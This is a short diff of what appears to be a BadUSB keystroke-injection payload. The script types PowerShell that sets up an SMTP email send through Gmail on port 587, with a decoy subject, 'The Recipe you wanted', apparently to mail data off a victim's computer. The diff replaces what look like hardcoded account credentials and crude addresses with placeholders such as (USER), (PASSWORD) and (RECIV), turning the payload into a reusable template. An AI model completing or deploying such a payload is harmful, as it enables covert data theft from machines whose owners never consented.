@@ -32,13 +32,13 @@ DELAY 2000
 STRING $SMTPPort = '587'
 ENTER
 DELAY 2000
-STRING $Username = 'joemamajeffxdxd"gmail.com'
+STRING $Username = '(USER)"gmail.com'
 ENTER
 DELAY 2000
-STRING $Password = 'joemamaxd'
+STRING $Password = '(PASSWORD)'
 ENTER
 DELAY 2000
-STRING $to = 'penislicker99919"gmail.com'
+STRING $to = '(RECIV)'
 ENTER
 DELAY 2000
 STRING $subject = @The Recipe you wanted@
